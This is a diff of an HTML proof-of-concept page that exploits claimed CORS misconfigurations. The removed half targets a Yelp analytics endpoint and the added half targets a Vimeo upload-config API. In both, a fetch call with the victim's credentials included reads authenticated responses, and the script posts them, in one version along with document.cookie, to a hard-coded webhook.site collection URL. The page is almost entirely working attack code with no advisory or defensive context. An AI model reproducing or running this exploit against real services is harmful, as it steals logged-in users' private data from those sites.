@@ -1,36 +1,35 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>POC: CORS + Credential Theft from sp.yelp.com</h1>
-    <script>
-      fetch("https://sp.yelp.com/com.snowplowanalytics.snowplow/tp2", {
-        method: "POST",
-        credentials: "include", // ensures victim cookies are sent
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          schema: "iglu:com.snowplowanalytics.snowplow/atomic/jsonschema/1-0-0",
-          data: [{ e: "pv", url: "https://evil.com/cors-poc" }]
-        })
-      })
+<head>
+  <title>Vimeo CORS PoC</title>
+</head>
+<body>
+  <h1>Vimeo CORS Misconfiguration PoC</h1>
+  <pre id="output">Loading...</pre>
+
+  <script>
+    // Vulnerable endpoint
+    const target = "https://api.vimeo.com/upload/config";
+
+    // Where to exfiltrate the response
+    const exfil = "https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65";
+
+    fetch(target, { credentials: "include" })
       .then(r => r.text())
-      .then(d => {
-        // Send response body + any accessible cookies to your webhook
-        fetch("https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65", {
+      .then(data => {
+        // Show stolen data on page
+        document.getElementById("output").innerText = data;
+
+        // Exfiltrate to webhook
+        fetch(exfil, {
           method: "POST",
-          mode: "no-cors", // ensures it succeeds silently
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            response: d,
-            cookies: document.cookie // will only show evil.com cookies, but demo clarity
-          })
+          body: data,
+          headers: { "Content-Type": "application/json" }
         });
       })
-      .catch(e => {
-        fetch("https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65", {
-          method: "POST",
-          mode: "no-cors",
-          body: "Error: " + e.toString()
-        });
+      .catch(err => {
+        document.getElementById("output").innerText = "Error: " + err;
       });
-    </script>
-  </body>
+  </script>
+</body>
 </html>
